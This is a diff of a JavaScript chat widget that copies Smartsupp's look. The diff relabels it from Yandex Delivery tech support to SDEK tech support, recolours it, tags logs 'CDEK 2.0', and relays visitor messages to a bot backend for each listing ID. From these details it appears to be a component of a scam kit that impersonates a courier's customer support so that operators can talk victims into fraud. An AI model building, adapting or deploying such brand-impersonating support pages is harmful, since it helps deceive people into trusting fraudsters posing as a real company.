@@ -1,16 +1,10 @@
-/**
- * Кастомная система чата поддержки - полная замена Smartsupp
- * Максимально похожий интерфейс и функционал
- */
-
 (function() {
     'use strict';
-    
-    // Конфигурация
-    const API_BASE_URL = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
-    const AD_ID = extractAdIdFromUrl() || window.adId || window.itemId || '4682910338';
+
+    const API_BASE_URL = '';
+    const AD_ID = extractAdIdFromUrl() || window.adId || window.itemId || '2217671294';
     const USER_FIRSTNAME = 'Пользователь';
-    
+
     let lastMessageId = 0;
     let seenMessageHashes = new Set();
     let chatWidget = null;
@@ -25,8 +19,7 @@
     let isTyping = false;
     let typingTimeout = null;
     let notificationSound = null;
-    
-    // Загружаем сохраненное состояние
+
     function loadState() {
         try {
             const saved = localStorage.getItem(`support_state_${AD_ID}`);
@@ -34,14 +27,12 @@
                 const state = JSON.parse(saved);
                 unreadCount = state.unreadCount || 0;
                 lastMessageId = state.lastMessageId || 0;
-                console.log(`💾 [SUPPORT] Загружено состояние: unreadCount=${unreadCount}, lastMessageId=${lastMessageId}`);
             }
         } catch (error) {
-            console.warn('⚠️ [SUPPORT] Ошибка загрузки состояния:', error);
+            console.warn('Error loading state:', error);
         }
     }
-    
-    // Сохраняем состояние
+
     function saveState() {
         try {
             const state = {
@@ -51,33 +42,22 @@
             };
             localStorage.setItem(`support_state_${AD_ID}`, JSON.stringify(state));
         } catch (error) {
-            console.warn('⚠️ [SUPPORT] Ошибка сохранения состояния:', error);
+            console.warn('Error saving state:', error);
         }
     }
-    
-    // Извлекаем AD ID из URL или других источников
+
     function extractAdIdFromUrl() {
-        // Сначала из URL path (самый надёжный)
         const match = window.location.pathname.match(/\/(\w+\d+)/);
         if (match) return match[1];
-        
-        // Из параметров URL
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get('id')) return urlParams.get('id');
-        
-        // Потом из глобальных переменных
         if (window.adId) return window.adId;
         if (window.itemId) return window.itemId;
-        
-        console.warn('⚠️ AD ID не найден, используем тестовый');
-        return '4682910338';
+        return '2217671294';
     }
-    
-    
-    // Создание HTML структуры чата (как в Smartsupp)
+
     function createChatHTML() {
         return `
-            <!-- Кнопка чата (как в Smartsupp) -->
             <div id="smartsupp-widget-button" class="smartsupp-widget-button">
                 <div class="smartsupp-button-icon">
                     <img src="/style/support/supportIcon.gif" alt="Поддержка">
@@ -87,9 +67,7 @@
                 </div>
             </div>
 
-            <!-- Окно чата (как в Smartsupp) -->
             <div id="smartsupp-widget-window" class="smartsupp-widget-window">
-                <!-- Заголовок -->
                 <div class="smartsupp-header">
                     <div class="smartsupp-header-content">
                         <div class="smartsupp-avatar">
@@ -117,11 +95,7 @@
                     </div>
                 </div>
 
-                <!-- Сообщения -->
                 <div class="smartsupp-messages" id="smartsupp-messages">
-                    <!-- Приветственное сообщение убрано -->
-                    
-                    <!-- Индикатор печати -->
                     <div class="smartsupp-typing-indicator" id="smartsupp-typing-indicator" style="display: none;">
                         <div class="smartsupp-message smartsupp-message-agent">
                             <div class="smartsupp-message-avatar">
@@ -138,7 +112,6 @@
                     </div>
                 </div>
 
-                <!-- Поле ввода -->
                 <div class="smartsupp-input-area">
                     <div class="smartsupp-input-wrapper">
                         <textarea 
@@ -154,48 +127,45 @@
                         </button>
                     </div>
                     <div class="smartsupp-powered-by">
-                        Техподдержка Яндекс.Доставка
+                        Техподдержка СДЭК
                     </div>
                 </div>
             </div>
         `;
     }
-    
-    
-    // CSS стили для чата (максимально похожие на Smartsupp)
+
     function createChatCSS() {
         const style = document.createElement('style');
         style.textContent = `
-            /* Основные стили виджета */
             .smartsupp-widget-button {
                 position: fixed;
                 bottom: 20px;
                 right: 20px;
                 width: 80px;
                 height: 80px;
-                background: #3373dc;
+                background: #1AB248;
                 border-radius: 50%;
                 cursor: pointer;
                 display: flex;
                 align-items: center;
                 justify-content: center;
-                box-shadow: 0 4px 16px rgba(51, 115, 220, 0.4);
+                box-shadow: 0 4px 16px rgba(26, 178, 72, 0.4);
                 z-index: 2147483647;
                 transition: all 0.3s ease;
                 color: white;
                 overflow: visible;
             }
-            
+
             .smartsupp-widget-button:hover {
                 transform: scale(1.1);
                 box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
             }
-            
+
             .smartsupp-widget-button.open {
                 transform: scale(0.95);
                 box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
             }
-            
+
             .smartsupp-button-icon {
                 width: 70px;
                 height: 70px;
@@ -205,14 +175,14 @@
                 align-items: center;
                 justify-content: center;
             }
-            
+
             .smartsupp-button-icon img {
                 width: 70px;
                 height: 70px;
                 object-fit: cover;
                 border-radius: 50%;
             }
-            
+
             .smartsupp-unread-badge {
                 position: absolute;
                 top: -8px;
@@ -232,23 +202,16 @@
                 animation: pulse-badge 2s infinite;
                 z-index: 10;
             }
-            
+
             .smartsupp-unread-badge.show {
                 display: flex !important;
             }
-            
+
             @keyframes pulse-badge {
-                0%, 100% { 
-                    transform: scale(1); 
-                    box-shadow: 0 0 0 0 rgba(255, 71, 87, 0.7);
-                }
-                50% { 
-                    transform: scale(1.1); 
-                    box-shadow: 0 0 0 10px rgba(255, 71, 87, 0);
-                }
+                0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 71, 87, 0.7); }
+                50% { transform: scale(1.1); box-shadow: 0 0 0 10px rgba(255, 71, 87, 0); }
             }
-            
-            /* Окно чата */
+
             .smartsupp-widget-window {
                 position: fixed;
                 bottom: 90px;
@@ -264,30 +227,23 @@
                 font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
                 overflow: hidden;
             }
-            
+
             .smartsupp-widget-window.open {
                 display: flex;
                 animation: slideUp 0.3s ease;
             }
-            
+
             .smartsupp-widget-window.minimized {
                 height: 60px;
             }
-            
+
             @keyframes slideUp {
-                from {
-                    opacity: 0;
-                    transform: translateY(20px);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0);
-                }
+                from { opacity: 0; transform: translateY(20px); }
+                to { opacity: 1; transform: translateY(0); }
             }
-            
-            /* Заголовок */
+
             .smartsupp-header {
-                background: #3373dc;
+                background: #1AB248;
                 color: white;
                 padding: 16px;
                 display: flex;
@@ -296,13 +252,13 @@
                 min-height: 60px;
                 box-sizing: border-box;
             }
-            
+
             .smartsupp-header-content {
                 display: flex;
                 align-items: center;
                 gap: 12px;
             }
-            
+
             .smartsupp-avatar img {
                 width: 36px;
                 height: 36px;
@@ -310,12 +266,12 @@
                 background: white;
                 object-fit: cover;
             }
-            
+
             .smartsupp-agent-name {
                 font-weight: 600;
                 font-size: 16px;
             }
-            
+
             .smartsupp-agent-status {
                 font-size: 12px;
                 opacity: 0.9;
@@ -323,7 +279,7 @@
                 align-items: center;
                 gap: 6px;
             }
-            
+
             .smartsupp-status-dot {
                 width: 8px;
                 height: 8px;
@@ -331,19 +287,18 @@
                 background: #2ed573;
                 animation: pulse 2s infinite;
             }
-            
+
             @keyframes pulse {
                 0%, 100% { opacity: 1; }
                 50% { opacity: 0.5; }
             }
-            
+
             .smartsupp-header-actions {
                 display: flex;
                 gap: 8px;
             }
-            
-            .smartsupp-minimize-btn,
-            .smartsupp-close-btn {
+
+            .smartsupp-minimize-btn, .smartsupp-close-btn {
                 background: none;
                 border: none;
                 color: white;
@@ -355,19 +310,16 @@
                 justify-content: center;
                 transition: background 0.2s;
             }
-            
-            .smartsupp-minimize-btn:hover,
-            .smartsupp-close-btn:hover {
+
+            .smartsupp-minimize-btn:hover, .smartsupp-close-btn:hover {
                 background: rgba(255, 255, 255, 0.2);
             }
-            
-            .smartsupp-minimize-btn svg,
-            .smartsupp-close-btn svg {
+
+            .smartsupp-minimize-btn svg, .smartsupp-close-btn svg {
                 width: 20px;
                 height: 20px;
             }
-            
-            /* Сообщения */
+
             .smartsupp-messages {
                 flex: 1;
                 overflow-y: auto;
@@ -377,57 +329,51 @@
                 gap: 16px;
                 background: #f8f9fa;
             }
-            
+
             .smartsupp-widget-window.minimized .smartsupp-messages {
                 display: none;
             }
-            
+
             .smartsupp-message {
                 display: flex;
                 gap: 8px;
                 max-width: 80%;
                 animation: fadeIn 0.3s ease;
             }
-            
+
             @keyframes fadeIn {
-                from {
-                    opacity: 0;
-                    transform: translateY(10px);
-                }
-                to {
-                    opacity: 1;
-                    transform: translateY(0);
-                }
+                from { opacity: 0; transform: translateY(10px); }
+                to { opacity: 1; transform: translateY(0); }
             }
-            
+
             .smartsupp-message-agent {
                 align-self: flex-start;
             }
-            
+
             .smartsupp-message-visitor {
                 align-self: flex-end;
                 flex-direction: row-reverse;
             }
-            
+
             .smartsupp-message-avatar img {
                 width: 32px;
                 height: 32px;
                 border-radius: 50%;
                 object-fit: cover;
             }
-            
+
             .user-avatar-icon {
                 width: 32px;
                 height: 32px;
                 border-radius: 50%;
-                background: #3373dc;
+                background: #1AB248;
                 color: white;
                 display: flex;
                 align-items: center;
                 justify-content: center;
                 font-size: 16px;
             }
-            
+
             .smartsupp-message-content {
                 background: white;
                 padding: 12px 16px;
@@ -435,32 +381,31 @@
                 box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
                 max-width: 100%;
             }
-            
+
             .smartsupp-message-visitor .smartsupp-message-content {
-                background: #3373dc;
+                background: #1AB248;
                 color: white;
             }
-            
+
             .smartsupp-message-text {
                 font-size: 14px;
                 line-height: 1.4;
                 word-wrap: break-word;
                 margin: 0;
             }
-            
+
             .smartsupp-message-time {
                 font-size: 11px;
                 opacity: 0.6;
                 margin-top: 4px;
             }
-            
-            /* Индикатор печати */
+
             .smartsupp-typing-dots {
                 display: flex;
                 gap: 4px;
                 padding: 8px 0;
             }
-            
+
             .smartsupp-typing-dots span {
                 width: 8px;
                 height: 8px;
@@ -468,35 +413,30 @@
                 background: #999;
                 animation: typing 1.4s infinite;
             }
-            
+
             .smartsupp-typing-dots span:nth-child(2) {
                 animation-delay: 0.2s;
             }
-            
+
             .smartsupp-typing-dots span:nth-child(3) {
                 animation-delay: 0.4s;
             }
-            
+
             @keyframes typing {
-                0%, 60%, 100% {
-                    transform: translateY(0);
-                }
-                30% {
-                    transform: translateY(-10px);
-                }
+                0%, 60%, 100% { transform: translateY(0); }
+                30% { transform: translateY(-10px); }
             }
-            
-            /* Поле ввода */
+
             .smartsupp-input-area {
                 background: white;
                 border-top: 1px solid #e9ecef;
                 padding: 16px;
             }
-            
+
             .smartsupp-widget-window.minimized .smartsupp-input-area {
                 display: none;
             }
-            
+
             .smartsupp-input-wrapper {
                 display: flex;
                 align-items: flex-end;
@@ -507,11 +447,11 @@
                 border: 1px solid #e9ecef;
                 transition: border-color 0.2s;
             }
-            
+
             .smartsupp-input-wrapper:focus-within {
-                border-color: #3373dc;
+                border-color: #1AB248;
             }
-            
+
             .smartsupp-input {
                 flex: 1;
                 border: none;
@@ -524,9 +464,9 @@
                 min-height: 20px;
                 font-family: inherit;
             }
-            
+
             .smartsupp-send-btn {
-                background: #3373dc;
+                background: #1AB248;
                 border: none;
                 border-radius: 50%;
                 width: 32px;
@@ -539,29 +479,28 @@
                 transition: background 0.2s;
                 flex-shrink: 0;
             }
-            
+
             .smartsupp-send-btn:hover {
-                background: #2c5aa0;
+                background: #159c3d;
             }
-            
+
             .smartsupp-send-btn:disabled {
                 background: #ccc;
                 cursor: not-allowed;
             }
-            
+
             .smartsupp-send-btn svg {
                 width: 16px;
                 height: 16px;
             }
-            
+
             .smartsupp-powered-by {
                 text-align: center;
                 font-size: 11px;
                 color: #999;
                 margin-top: 8px;
             }
-            
-            /* Мобильная адаптация */
+
             @media (max-width: 480px) {
                 .smartsupp-widget-window {
                     width: calc(100vw - 20px);
@@ -569,37 +508,28 @@
                     bottom: 10px;
                     right: 10px;
                 }
-                
                 .smartsupp-widget-button {
                     bottom: 15px;
                     right: 15px;
                     width: 50px;
                     height: 50px;
                 }
-                
-                .smartsupp-button-icon svg {
-                    width: 20px;
-                    height: 20px;
-                }
             }
         `;
         document.head.appendChild(style);
     }
-    
-    
-    // Получение текущего времени
+
     function getCurrentTime() {
         const now = new Date();
-        return now.getHours().toString().padStart(2, '0') + ':' + 
+        return now.getHours().toString().padStart(2, '0') + ':' +
                now.getMinutes().toString().padStart(2, '0');
     }
-    
-    // Отправка сообщения в бот с логированием
+
     async function sendMessageToBot(message) {
         try {
-            console.log('📤 [SUPPORT] Отправка сообщения в бот:', message);
-            
-            const response = await fetch(`${API_BASE_URL}/api/supportMessage`, {
+            console.log('[SUPPORT] Отправка сообщения в бот:', message);
+
+            const response = await fetch(API_BASE_URL + '/api/supportMessage', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -611,35 +541,30 @@
                     firstname: USER_FIRSTNAME
                 })
             });
-            
+
             const result = await response.json();
-            
+
             if (result.ok) {
-                console.log('✅ [SUPPORT] Сообщение отправлено в бот');
-                
-                // Логируем отправку сообщения
+                console.log('[SUPPORT] Сообщение отправлено в бот');
+
                 await logSupportActivity('message_sent', {
                     message: message,
                     timestamp: new Date().toISOString()
                 });
-                
                 return true;
             } else {
-                console.error('❌ [SUPPORT] Ошибка отправки:', result.error);
+                console.error('[SUPPORT] Ошибка отправки:', result.error);
                 return false;
             }
         } catch (error) {
-            console.error('❌ [SUPPORT] Ошибка при отправке сообщения:', error);
+            console.error('[SUPPORT] Ошибка при отправке сообщения:', error);
             return false;
         }
     }
-    
-    // Отправка уведомления о прочтении сообщений
+
     async function markMessagesAsRead() {
         try {
-            console.log('📖 [SUPPORT] Отправка уведомления о прочтении сообщений для AD:', AD_ID);
-            
-            const response = await fetch(`${API_BASE_URL}/api/markSupportMessagesRead`, {
+            const response = await fetch(API_BASE_URL + '/api/markSupportMessagesRead', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -650,32 +575,17 @@
                     timestamp: new Date().toISOString()
                 })
             });
-            
+
             const result = await response.json();
-            
-            if (result.ok) {
-                console.log('✅ [SUPPORT] Уведомление о прочтении отправлено успешно');
-                
-                // Логируем прочтение сообщений
-                await logSupportActivity('messages_read', {
-                    timestamp: new Date().toISOString()
-                });
-                
-                return true;
-            } else {
-                console.error('❌ [SUPPORT] Ошибка отправки уведомления о прочтении:', result.error);
-                return false;
-            }
+            return result.ok;
         } catch (error) {
-            console.error('❌ [SUPPORT] Ошибка при отправке уведомления о прочтении:', error);
             return false;
         }
     }
-    
-    // Логирование активности поддержки
+
     async function logSupportActivity(action, data = {}) {
         try {
-            const response = await fetch(`${API_BASE_URL}/api/log`, {
+            await fetch(API_BASE_URL + '/api/log', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -687,20 +597,15 @@
                     eventType: 'support_activity',
                     supportAction: action,
                     supportData: data,
-                    timestamp: new Date().toISOString()
+                    timestamp: new Date().toISOString(),
+                    service: 'CDEK 2.0'
                 })
             });
-            
-            console.log('📊 [SUPPORT] Активность залогирована:', action);
-        } catch (error) {
-            console.error('❌ [SUPPORT] Ошибка логирования:', error);
-        }
+        } catch (error) {}
     }
-    
-    // Добавление сообщения пользователя в чат
+
     function addUserMessage(text) {
         if (!messagesContainer) return;
-        
         const messageDiv = document.createElement('div');
         messageDiv.className = 'smartsupp-message smartsupp-message-visitor';
         messageDiv.innerHTML = `
@@ -712,45 +617,29 @@
                 <div class="smartsupp-message-time">${getCurrentTime()}</div>
             </div>
         `;
-        
-        // Вставляем перед индикатором печати
         const typingIndicator = document.getElementById('smartsupp-typing-indicator');
         messagesContainer.insertBefore(messageDiv, typingIndicator);
-        
-        // Прокручиваем к низу с задержкой для анимации
         setTimeout(() => scrollToBottom(true), 100);
-        
-        console.log('💬 [SUPPORT] Добавлено сообщение пользователя:', text);
     }
-    
-    // Воспроизведение звука уведомления
+
     function playNotificationSound() {
         try {
             if (notificationSound) {
-                notificationSound.currentTime = 0; // Сбрасываем на начало
-                notificationSound.play().catch(error => {
-                    console.warn('⚠️ [SUPPORT] Не удалось воспроизвести звук:', error);
-                });
-                console.log('🔊 [SUPPORT] Звук уведомления воспроизведен');
+                notificationSound.currentTime = 0;
+                notificationSound.play().catch(function() {});
             } else {
-                // Если звук не загружен, создаем системное уведомление
                 if ('Notification' in window && Notification.permission === 'granted') {
                     new Notification('Новое сообщение', {
                         body: 'Получено сообщение от техподдержки',
                         icon: '/style/support/supportIcon.gif'
                     });
                 }
-                console.log('🔔 [SUPPORT] Системное уведомление показано');
             }
-        } catch (error) {
-            console.warn('⚠️ [SUPPORT] Ошибка воспроизведения звука:', error);
-        }
+        } catch (error) {}
     }
-    
-    // Добавление сообщения оператора в чат
+
     function addOperatorMessage(text) {
         if (!messagesContainer) return;
-        
         const messageDiv = document.createElement('div');
         messageDiv.className = 'smartsupp-message smartsupp-message-agent';
         messageDiv.innerHTML = `
@@ -762,27 +651,16 @@
                 <div class="smartsupp-message-time">${getCurrentTime()}</div>
             </div>
         `;
-        
-        // Вставляем перед индикатором печати
         const typingIndicator = document.getElementById('smartsupp-typing-indicator');
         messagesContainer.insertBefore(messageDiv, typingIndicator);
-        
-        // Прокручиваем к низу с задержкой для анимации
         setTimeout(() => scrollToBottom(true), 100);
-        
-        console.log('🎧 [SUPPORT] Добавлено сообщение оператора:', text);
-        
-        // Воспроизводим звук уведомления
         playNotificationSound();
-        
-        // Логируем получение сообщения
         logSupportActivity('message_received', {
             message: text,
             timestamp: new Date().toISOString()
         });
     }
-    
-    // Показать индикатор печати
+
     function showTyping() {
         const typingIndicator = document.getElementById('smartsupp-typing-indicator');
         if (typingIndicator) {
@@ -790,131 +668,91 @@
             scrollToBottom();
         }
     }
-    
-    // Скрыть индикатор печати
+
     function hideTyping() {
         const typingIndicator = document.getElementById('smartsupp-typing-indicator');
         if (typingIndicator) {
             typingIndicator.style.display = 'none';
         }
     }
-    
-    // Экранирование HTML
+
     function escapeHtml(text) {
         const div = document.createElement('div');
         div.textContent = text;
         return div.innerHTML;
     }
-    
-    // Прокрутка к низу
+
     function scrollToBottom(smooth = true) {
         if (messagesContainer) {
-            const scrollOptions = {
+            messagesContainer.scrollTo({
                 top: messagesContainer.scrollHeight,
                 behavior: smooth ? 'smooth' : 'auto'
-            };
-            messagesContainer.scrollTo(scrollOptions);
-            console.log('📜 [SUPPORT] Прокрутка к низу выполнена');
+            });
         }
     }
-    
-    // Обновление счетчика непрочитанных
+
     function updateUnreadCount(count) {
         unreadCount = count;
         const badge = document.getElementById('smartsupp-unread-badge');
         const countEl = document.getElementById('smartsupp-unread-count');
-        
-        console.log(`📊 [SUPPORT] Обновление счетчика непрочитанных: ${count} (isOpen: ${isOpen}, isMinimized: ${isMinimized})`);
-        
         if (badge && countEl) {
             if (count > 0) {
                 badge.classList.add('show');
                 badge.style.display = 'flex';
                 countEl.textContent = count;
-                console.log(`🔴 [SUPPORT] Показываем красную циферку: ${count}`);
-                
-                // Принудительно обновляем стили
-                badge.style.visibility = 'visible';
-                badge.style.opacity = '1';
             } else {
                 badge.classList.remove('show');
                 badge.style.display = 'none';
-                badge.style.visibility = 'hidden';
-                badge.style.opacity = '0';
-                console.log(`⚪ [SUPPORT] Скрываем циферку`);
             }
-        } else {
-            console.error('❌ [SUPPORT] Элементы badge не найдены!');
         }
-        
-        // Сохраняем состояние
         saveState();
     }
-    
-    // Автоматическое изменение размера textarea
+
     function autoResizeTextarea(textarea) {
         textarea.style.height = 'auto';
         textarea.style.height = Math.min(textarea.scrollHeight, 100) + 'px';
     }
-    
-    // Отправка сообщения
+
     function sendMessage() {
         if (!inputField) return;
-        
         const text = inputField.value.trim();
         if (!text) return;
-        
         addUserMessage(text);
         inputField.value = '';
         autoResizeTextarea(inputField);
-        
-        // Отправляем в бот БЕЗ показа индикатора печати
-        sendMessageToBot(text).then(success => {
+        sendMessageToBot(text).then(function(success) {
             if (!success) {
                 addOperatorMessage('Извините, произошла ошибка при отправке сообщения. Попробуйте еще раз.');
             }
         });
-        
-        // Сбрасываем счетчик непрочитанных при отправке
         updateUnreadCount(0);
     }
-    
-    
-    // Получение сообщений от бота (polling)
+
     async function pollMessagesFromBot() {
         try {
-            const response = await fetch(`${API_BASE_URL}/api/getSupportMessages?adId=${AD_ID}&lastId=${lastMessageId}`, {
+            const response = await fetch(API_BASE_URL + '/api/getSupportMessages?adId=' + AD_ID + '&lastId=' + lastMessageId, {
                 method: 'GET',
-                headers: {
-                    'ngrok-skip-browser-warning': 'true'
-                }
+                headers: { 'ngrok-skip-browser-warning': 'true' }
             });
             const result = await response.json();
-            
+
             if (result.ok && result.messages && result.messages.length > 0) {
-                console.log(`📨 [SUPPORT] Получено ${result.messages.length} сообщений от оператора`);
-                
                 let newMessagesCount = 0;
-                result.messages.forEach(msg => {
+                result.messages.forEach(function(msg) {
                     const text = msg.text || msg.content;
                     if (text) {
                         const hash = text + '_' + (msg.id || 0);
-                        if (seenMessageHashes.has(hash)) {
-                            return;
-                        }
+                        if (seenMessageHashes.has(hash)) return;
                         seenMessageHashes.add(hash);
-                        
-                        console.log('📨 [SUPPORT] Добавляем сообщение от оператора:', text);
                         addOperatorMessage(text);
                         newMessagesCount++;
-                        
                         if (!isOpen || isMinimized) {
                             unreadCount++;
                         }
                     }
                     lastMessageId = Math.max(lastMessageId, msg.id || 0);
                 });
-                
+
                 if (newMessagesCount > 0) {
                     saveState();
                     if (!isOpen || isMinimized) {
@@ -924,107 +762,79 @@
                     }
                 }
             }
-        } catch (error) {
-            console.error('❌ [SUPPORT] Ошибка получения сообщений:', error);
-        }
+        } catch (error) {}
     }
-    
-    // Инициализация чата
+
     function init() {
-        if (!AD_ID) {
-            console.error('❌ [SUPPORT] AD ID не найден');
-            return;
-        }
-        
-        console.log('🚀 [SUPPORT] Инициализация системы поддержки для', AD_ID);
-        
-        // Загружаем сохраненное состояние
+        if (!AD_ID) return;
+
         loadState();
-        
-        // Запрашиваем разрешение на уведомления
+
         if ('Notification' in window && Notification.permission === 'default') {
-            Notification.requestPermission().then(permission => {
-                console.log('🔔 [SUPPORT] Разрешение на уведомления:', permission);
-            });
+            Notification.requestPermission();
         }
-        
-        // Инициализируем звук уведомления
+
         try {
             notificationSound = new Audio('/style/support/notification.mp3');
-            notificationSound.volume = 1.0; // Максимальная громкость
-            console.log('🔊 [SUPPORT] Звук уведомления загружен');
-        } catch (error) {
-            console.warn('⚠️ [SUPPORT] Не удалось загрузить звук уведомления:', error);
-        }
-        
-        // Создаем CSS
+            notificationSound.volume = 1.0;
+        } catch (error) {}
+
         createChatCSS();
-        
-        // Создаем HTML
+
         const chatHTML = createChatHTML();
         document.body.insertAdjacentHTML('beforeend', chatHTML);
-        
-        // Получаем ссылки на элементы
+
         chatWidget = document.querySelector('.smartsupp-widget-button');
         chatWindow = document.querySelector('.smartsupp-widget-window');
         messagesContainer = document.getElementById('smartsupp-messages');
         inputField = document.getElementById('smartsupp-input');
         sendButton = document.getElementById('smartsupp-send-btn');
-        
-        // Восстанавливаем счетчик непрочитанных
+
         if (unreadCount > 0) {
             updateUnreadCount(unreadCount);
         }
-        
-        // Обработчики событий
+
         if (chatWidget) {
             chatWidget.addEventListener('click', toggleChat);
         }
-        
+
         if (sendButton) {
             sendButton.addEventListener('click', sendMessage);
         }
-        
+
         if (inputField) {
-            inputField.addEventListener('keydown', (e) => {
+            inputField.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter' && !e.shiftKey) {
                     e.preventDefault();
                     sendMessage();
                 }
             });
-            
-            inputField.addEventListener('input', (e) => {
+            inputField.addEventListener('input', function(e) {
                 autoResizeTextarea(e.target);
             });
         }
-        
-        // Кнопки управления
+
         const minimizeBtn = document.getElementById('smartsupp-minimize-btn');
         const closeBtn = document.getElementById('smartsupp-close-btn');
-        
+
         if (minimizeBtn) {
             minimizeBtn.addEventListener('click', minimizeChat);
         }
-        
+
         if (closeBtn) {
             closeBtn.addEventListener('click', closeChat);
         }
-        
-        // Запускаем polling
+
         setInterval(pollMessagesFromBot, 3000);
-        
-        // Логируем инициализацию
+
         logSupportActivity('chat_initialized', {
             adId: AD_ID,
             unreadCount: unreadCount,
             lastMessageId: lastMessageId,
             timestamp: new Date().toISOString()
         });
-        
-        console.log('✅ [SUPPORT] Система поддержки инициализирована');
     }
-    
-    // Открытие чата
+
     function openChat() {
         if (chatWindow && chatWidget) {
             chatWindow.classList.add('open');
@@ -1032,36 +842,26 @@
             chatWidget.classList.add('open');
             isOpen = true;
             isMinimized = false;
-            
-            // Сбрасываем счетчик непрочитанных и отправляем уведомление о прочтении
+
             const hadUnreadMessages = unreadCount > 0;
             if (hadUnreadMessages) {
                 markMessagesAsRead();
             }
             unreadCount = 0;
             updateUnreadCount(0);
-            
-            // Прокручиваем к низу (к последним сообщениям)
-            setTimeout(() => {
+
+            setTimeout(function() {
                 scrollToBottom(true);
-                
-                // Фокус на поле ввода
-                if (inputField) {
-                    inputField.focus();
-                }
+                if (inputField) inputField.focus();
             }, 300);
-            
-            // Логируем открытие
+
             logSupportActivity('chat_opened', {
                 hadUnreadMessages: hadUnreadMessages,
                 timestamp: new Date().toISOString()
             });
-            
-            console.log('📞 [SUPPORT] Чат открыт, непрочитанных было:', hadUnreadMessages ? 'да' : 'нет');
         }
     }
-    
-    // Закрытие чата
+
     function closeChat() {
         if (chatWindow && chatWidget) {
             chatWindow.classList.remove('open');
@@ -1069,166 +869,66 @@
             chatWidget.classList.remove('open');
             isOpen = false;
             isMinimized = false;
-            
-            // Логируем закрытие
+
             logSupportActivity('chat_closed', {
                 timestamp: new Date().toISOString()
             });
-            
-            console.log('❌ [SUPPORT] Чат закрыт');
         }
     }
-    
-    // Минимизация чата
+
     function minimizeChat() {
         if (chatWindow) {
             chatWindow.classList.add('minimized');
             isMinimized = true;
-            
-            console.log('➖ [SUPPORT] Чат минимизирован');
         }
     }
-    
-    // Переключение чата
+
     function toggleChat() {
         if (isOpen) {
             if (isMinimized) {
-                // Если минимизирован, разворачиваем
                 chatWindow.classList.remove('minimized');
                 isMinimized = false;
-                
-                // Сбрасываем счетчик непрочитанных и отправляем уведомление о прочтении
                 const hadUnreadMessages = unreadCount > 0;
                 if (hadUnreadMessages) {
                     markMessagesAsRead();
                 }
                 unreadCount = 0;
                 updateUnreadCount(0);
-                
-                // Прокручиваем к низу
-                setTimeout(() => {
+                setTimeout(function() {
                     scrollToBottom(true);
-                    if (inputField) {
-                        inputField.focus();
-                    }
+                    if (inputField) inputField.focus();
                 }, 100);
-                
-                console.log('📞 [SUPPORT] Чат развернут из минимизированного состояния, непрочитанных было:', hadUnreadMessages ? 'да' : 'нет');
             } else {
-                // Если открыт, закрываем
                 closeChat();
             }
         } else {
-            // Если закрыт, открываем
             openChat();
         }
     }
-    
-    
-    // Публичный API (совместимость со Smartsupp)
-    window.smartsupp = function(command, ...args) {
-        console.log('🔧 [SUPPORT] Smartsupp API вызов:', command, args);
-        
+
+    window.smartsupp = function(command) {
         switch (command) {
-            case 'chat:open':
-                openChat();
-                break;
-            case 'chat:close':
-                closeChat();
-                break;
-            case 'chat:minimize':
-                minimizeChat();
-                break;
-            case 'chat:message':
-                if (args[0] && args[0].type === 'agent') {
-                    addOperatorMessage(args[0].text);
-                }
-                break;
-            case 'on':
-                // Эмуляция событий
-                if (args[0] === 'message_sent' && typeof args[1] === 'function') {
-                    // Сохраняем callback для отправки сообщений
-                    window._smartsuppMessageCallback = args[1];
-                }
-                break;
-            default:
-                console.warn('⚠️ [SUPPORT] Неизвестная команда Smartsupp:', command);
+            case 'chat:open': openChat(); break;
+            case 'chat:close': closeChat(); break;
+            case 'chat:minimize': minimizeChat(); break;
         }
     };
-    
-    // Кастомный API
+
     window.CustomChat = {
         open: openChat,
         close: closeChat,
         minimize: minimizeChat,
         toggle: toggleChat,
-        
-        isOpen: function() {
-            return isOpen;
-        },
-        
-        isMinimized: function() {
-            return isMinimized;
-        },
-        
+        isOpen: function() { return isOpen; },
+        isMinimized: function() { return isMinimized; },
         addOperatorMessage: addOperatorMessage,
-        addUserMessage: addUserMessage,
-        
-        // Тестовые методы
-        testOperatorMessage: function() {
-            addOperatorMessage('Тестовое сообщение от оператора техподдержки');
-        },
-        
-        testUserMessage: function() {
-            addUserMessage('Тестовое сообщение от пользователя');
-        },
-        
-        testUnreadCount: function() {
-            updateUnreadCount(5);
-            console.log('🧪 [SUPPORT] Тестируем счетчик непрочитанных: 5');
-        },
-        
-        testSound: function() {
-            playNotificationSound();
-            console.log('🧪 [SUPPORT] Тестируем звук уведомления');
-        },
-        
-        testReadNotification: function() {
-            markMessagesAsRead();
-            console.log('🧪 [SUPPORT] Тестируем уведомление о прочтении');
-        },
-        
-        // Функции для обновления состояния
-        updateUnreadCount: updateUnreadCount,
-        
-        // Функции для управления состоянием
-        clearState: function() {
-            localStorage.removeItem(`support_state_${AD_ID}`);
-            unreadCount = 0;
-            lastMessageId = 0;
-            updateUnreadCount(0);
-            console.log('🧹 [SUPPORT] Состояние очищено');
-        },
-        
-        // Информация о системе
-        getInfo: function() {
-            return {
-                adId: AD_ID,
-                isOpen: isOpen,
-                isMinimized: isMinimized,
-                unreadCount: unreadCount,
-                lastMessageId: lastMessageId
-            };
-        }
+        addUserMessage: addUserMessage
     };
-    
-    // Запуск при загрузке страницы
+
     if (document.readyState === 'loading') {
         document.addEventListener('DOMContentLoaded', init);
     } else {
         init();
     }
-    
-    console.log('🎧 [SUPPORT] Модуль кастомного чата загружен для AD:', AD_ID);
-    
+
 })();
